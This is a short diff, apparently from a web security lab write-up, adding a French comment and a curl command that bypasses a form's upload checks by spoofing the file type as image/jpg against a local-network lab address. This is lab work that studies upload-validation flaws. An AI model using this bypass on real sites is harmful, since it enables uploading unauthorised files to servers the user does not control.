@@ -1,1 +1,2 @@
+Grâce à Curl, tromper les vérifications du formulaire en forçant le type de fichier uploadé.
 curl -F "uploaded=@curl;type=image/jpg" -F Upload="Upload" http://192.168.56.101/\?page\=upload
